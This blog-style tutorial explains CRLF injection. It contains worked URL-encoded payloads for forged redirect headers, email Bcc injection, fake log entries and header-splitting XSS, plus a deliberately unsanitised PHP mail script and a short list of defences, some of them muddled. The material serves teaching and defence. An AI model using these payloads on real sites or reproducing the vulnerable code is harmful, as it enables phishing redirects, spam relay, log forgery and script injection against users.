---
title: CRLF injection
date: 2025-01-27 10:00:00 +0530
categories: [Web Security, Injection]
tags: [Web Security, CRLF, Injection]
render_with_liquid: false
---

# Understanding CRLF Injection and Its Exploitation

CRLF (Carriage Return Line Feed) injection is a type of attack that targets web applications through the manipulation of HTTP headers. The term “CRLF” refers to the characters used to mark the end of a line in HTTP requests and responses. These characters (`\r\n`) are critical in marking boundaries between headers and their values, and when abused, they allow attackers to inject malicious content or manipulate server behavior.

In this blog post, we'll dive into what CRLF injection is, where it’s commonly found, and how attackers can exploit it to cause significant damage, such as redirecting users to malicious sites, sending unauthorized emails, logging false entries, and executing cross-site scripting (XSS) attacks.

## What is CRLF Injection?

CRLF injection occurs when an attacker is able to inject CRLF characters into user-controllable input, which is then included in HTTP headers or other server-side outputs. This can lead to several security issues, such as HTTP response splitting, header injection, email injection, and more. CRLF injection exploits weak input validation or improper sanitization in the web application, allowing the attacker to control how headers are formatted or logged.

## Common Places for CRLF Injection Exploitation

### Exploiting Automatic Directory Completion

A common vulnerability occurs when a website’s directory completion feature automatically appends a slash to URLs. For instance, a website might redirect you to a directory with a trailing slash when you access it without one:

```
GET /helloworld <-- no slash HTTP/1.1 Host: site.com Accept: application/json
```

The server responds by redirecting you to the following URL:

HTTP/1.1 301 Moved Permanently Location: `/hello-world/ <-- slash`

Now, an attacker can inject CRLF characters to manipulate the redirection, resulting in the following request:

```
GET /helloworld%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1 Host: site.com Accept: application/json
```

This response contains two `Location` headers:

```
HTTP/1.1 302 Found Location: /hello-world Location: https://hacker-site.com/
```

Anyone clicking the manipulated URL will be redirected to a malicious website instead of the intended `/hello-world` page.

### Exploiting Redirections

CRLF injection can also be used in redirection functionality. For example, an API may redirect users to a provided URL:
```
GET /api/redirect?url=https%3A%2F%2Fsite.com%2Fhello-world HTTP/1.1 Host: site.com Accept: application/json
```

The server responds with:
```
HTTP/1.1 302 Found Location: https://site.com/hello-world
```

By injecting CRLF characters into the URL parameter, the attacker can alter the redirection:
```
GET /api/redirect?url=%2Fhello-world%0d%0aLocation%3A%20https%3A%2F%2Fhacker-site.com HTTP/1.1 Host: site.com Accept: application/json
```

The response will now look like this:
```
HTTP/1.1 302 Found Location: /hello-world Location: https://hacker-site.com/
```

This results in users being redirected to the attacker's website instead of the legitimate one.

### Email Injection

One of the more dangerous attack vectors for CRLF injection is email systems. If user input is incorporated into email headers without proper validation, an attacker can inject arbitrary headers, potentially sending emails to unintended recipients or modifying the behavior of the email server.

Consider a vulnerable PHP script that sends a feedback email:

```php
<?php
$name = $_POST['name'];
$replyto = $_POST['replyTo'];
$message = $_POST['message'];
$to = 'root@localhost';
$subject = 'Random subject';

$headers = "From: $name \n" . "Reply-To: $replyto";
mail($to, $subject, $message, $headers);
?>
```
If the name input is not sanitized properly, an attacker can inject CRLF characters to create custom email headers, such as the Bcc header to send the email to multiple recipients:

```
POST /feedback.php HTTP/1.1
Host: site.com
Accept: application/json
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

name=peter%0d%0aBcc%3A%20notaniceguy%40company.com&replyTo=peter%40serious.bznes&message=You're%20not%20a%20nice%20guy%20%3A(
```
This results in the email headers being:
```
From: peter
Bcc: notaniceguy@company.com
Reply-To: peter@serious.bznes
```
As a result, the email is sent not only to the intended recipient but also to the attacker’s specified recipient.

### Log Injection
CRLF injection can be exploited in logging systems to inject custom log entries, which can mislead administrators or fill logs with irrelevant information. For example, if a system logs user login attempts:

```
1708853728374:peter:False
1708853743574:peter:True
```
An attacker can inject a malicious entry:
```
peter:False%0d%0a1708853860227:admin:True
```
The resulting log file would look like this:
```
1708853728374:peter:False
1708853743574:peter:True
_________________________
1708853860227:admin:True  <-- Fake log entry!
```
This could potentially trick the administrator into believing that the attacker successfully logged in as the admin user at a specific time.

### Reflected XSS
Another potential exploitation of CRLF injection occurs when user input is reflected in cookies or HTTP headers. For example, if a website stores the lang parameter in a `cookie`:
```
GET /language?lang=en-US HTTP/1.1
Host: site.com
Accept: text/html
```
The response might include:
```
HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
```
An attacker can inject malicious JavaScript using CRLF to break the cookie and inject an arbitrary Content-Type header:
```
GET /language?lang=en-US%3B%3C%0d%0a%3EContent-Type%3A%20text%2Fhtml%3C%0d%0a%3EContent-Length%3A25%3C%0d%0a%0d%0a%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Host: site.com
Accept: text/html
```
The response would now include the injected payload:
```
HTTP/1.1 301 Moved Permanently
Location: /
Set-Cookie: lang=en-US;
Content-Type: text/html
Content-Length: 25
<script>alert(1)</script>;
```
This results in a reflected XSS vulnerability, executing the injected script in the user’s browser.

## How to Protect Against CRLF Injection
The best way to prevent CRLF injection vulnerabilities is to perform proper input validation and sanitization. Here are some common defenses:

1. Sanitize User Input: Ensure that user-controlled data does not contain CRLF characters before using it in HTTP headers or logs. Reject or encode CRLF sequences if detected.

2. Use Prepared Statements: For scenarios like email injection or SQL queries, always use prepared statements or parameterized queries to avoid injection risks.

3. Set Proper Content Security Policies: For XSS protection, implement content security policies (CSP) that prevent the execution of malicious scripts.

4. Log Sanitization: Ensure that all logs are sanitized before writing them to files or databases. This helps avoid the manipulation of logs by attackers.

## Conclusion
CRLF injection is a powerful attack vector that can cause a variety of issues, from redirecting users to malicious websites to executing unwanted actions like email or log injection. Understanding where CRLF injection can occur and how it can be exploited is crucial for securing web applications and preventing attackers from leveraging it to compromise systems.

By employing proper input validation, sanitization, and other security best practices, we can significantly reduce the risk of CRLF injection and improve the overall security of web applications.

## References
* https://owasp.org/www-community/vulnerabilities/CRLF_Injection
* https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
